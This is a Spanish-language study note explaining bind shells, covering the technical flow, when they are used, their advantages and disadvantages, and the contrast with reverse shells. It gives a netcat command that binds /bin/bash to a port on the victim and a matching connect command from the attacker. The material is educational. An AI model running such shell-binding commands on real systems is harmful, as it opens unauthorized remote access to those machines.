>En una bind shell, la víctima abre un puerto y queda esperando conexiones del atacante.
	`Atacante  ───────►  Víctima           (conecta)`
>La víctima “bindea” (asocia) una shell a un puerto.

---
## 🔁 Flujo técnico

1. Se ejecuta payload en víctima.    
2. La víctima abre un puerto.
3. Se asocia una shell al socket.
4. El atacante se conecta.
5. Obtiene acceso interactivo.

---
## 🛠 Ejemplo conceptual

### En víctima:
`nc -lvnp 4444 -e /bin/bash`
### En atacante:
`nc VICTIM_IP 4444`

---
## 🧠 ¿Cuándo se usa?

- En redes internas
- Cuando el atacante puede acceder directamente
- En laboratorios
- Cuando no hay firewall bloqueando entradas

---
## ⚖️ Ventajas

✔️ No necesita que el atacante esté esperando antes  
✔️ Simple conceptualmente

## ❌ Desventajas

❌ Muy fácil de detectar  
❌ Bloqueada por NAT/firewalls  
❌ Expone puerto en víctima

---
## Ejemplo practico

- La diferencia con la Reverse Shell es que la maquina **Victima** dispone su bin/bash de forma temporal mediante un puerto.
- Y la maquina **Atacante** escucha ese puerto y se conecta, porque la **Victima** dispuso su consola.